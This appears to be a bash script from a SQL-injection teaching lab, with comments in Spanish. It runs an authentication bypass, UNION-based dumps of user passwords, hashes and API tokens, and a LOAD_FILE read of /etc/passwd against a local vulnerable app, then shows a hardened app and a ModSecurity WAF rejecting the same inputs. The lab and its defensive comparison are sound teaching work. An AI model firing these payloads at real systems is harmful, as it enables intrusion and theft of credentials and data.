#!/usr/bin/env bash
# ============================================================================
#  run-demo.sh  -  Reproduce las pruebas del laboratorio (2 vulnerabilidades).
#  Requiere los contenedores arriba:  docker compose up -d --build
#  Uso:  bash evidencias/run-demo.sh | tee evidencias/salida.txt
# ============================================================================
set -u
VULN=http://localhost:3000
WAF=http://localhost:8080
SEC=http://localhost:3001
line(){ printf '\n========== %s ==========\n' "$1"; }
code(){ curl -s -o /dev/null -w "%{http_code}" "$1"; }

line "0) Salud de los servicios"
for u in "$VULN" "$WAF" "$SEC"; do printf "  %-28s -> " "$u"; curl -s "$u/health" || echo "(sin /health)"; echo; done

line "VULNERABILIDAD 1 - LOGIN: bypass de autenticacion (vuln :3000)"
curl -s -c /tmp/cj -o /dev/null -w "  POST /login  username=admin' --   -> HTTP %{http_code} (302 = bypass OK)\n" \
  --data-urlencode "username=admin' -- " --data-urlencode "password=cualquier_cosa" "$VULN/login"
printf "  acceso al panel admin -> "; curl -s -b /tmp/cj "$VULN/panel" | grep -oE 'FLAG\{[^}]*\}' | head -1
printf "  mismo payload en la app SEGURA (:3001) -> HTTP %s (401 = rechazado)\n" \
  "$(curl -s -o /dev/null -w '%{http_code}' --data-urlencode "username=admin' -- " --data-urlencode "password=x" "$SEC/login")"

line "VULNERABILIDAD 2 - BUSCADOR: extraccion de datos por UNION (vuln :3000)"
echo "  Payload: ?q=zzz' UNION SELECT id,username,pass_plain,password_hash,role,email FROM users-- -"
curl -s "$VULN/?q=zzz%27%20UNION%20SELECT%20id,username,pass_plain,password_hash,role,email%20FROM%20users--%20-" \
  | grep -oE '<h3><a[^>]*>[^<]+</a></h3>' | sed 's/<[^>]*>//g' | sed 's/^/    usuario extraido: /' | head
echo "  -- volcado de la tabla secrets:"
curl -s "$VULN/?q=zzz%27%20UNION%20SELECT%20label,secret_value,api_token,4,5,6%20FROM%20secrets--%20-" \
  | grep -oE '<h3><a[^>]*>[^<]+</a></h3>' | sed 's/<[^>]*>//g' | sed 's/^/    secret: /' | head

line "La app SEGURA (:3001) resiste el buscador"
printf "  mismo UNION contra :3001 -> %s productos (0 = sin fuga, tratado como texto)\n" \
  "$(curl -s "$SEC/?q=zzz%27%20UNION%20SELECT%20id,username,pass_plain,password_hash,role,email%20FROM%20users--%20-" | grep -c 'class=\"card\"')"

line "IMPACTO (privilegio FILE del usuario de BD)"
printf "    app_root  (vuln)  LOAD_FILE('/etc/passwd') len: "; docker compose exec -T db mysql -uapp_root -papp_root_pw -N -e "SELECT LENGTH(LOAD_FILE('/etc/passwd'));" 2>/dev/null
printf "    app_least (secure) LOAD_FILE('/etc/passwd')    : "; docker compose exec -T db mysql -uapp_least -papp_least_pw -N -e "SELECT IFNULL(LOAD_FILE('/etc/passwd'),'NULL (sin privilegio FILE)');" 2>/dev/null | tail -1

line "WAF ModSecurity / OWASP CRS (:8080, delante de la vulnerable)"
printf "    normal  /?q=teclado           -> HTTP %s\n" "$(code "$WAF/?q=teclado")"
printf "    UNION SELECT (buscador)       -> HTTP %s (403 = bloqueado por CRS)\n" "$(code "$WAF/?q=zzz%27%20UNION%20SELECT%201,2,3,4,5,6--%20-")"
printf "    union select (minuscula)      -> HTTP %s (403 = CRS normaliza)\n" "$(code "$WAF/?q=zzz%27%20union%20select%201,2,3,4,5,6--%20-")"
echo
echo "========== FIN =========="
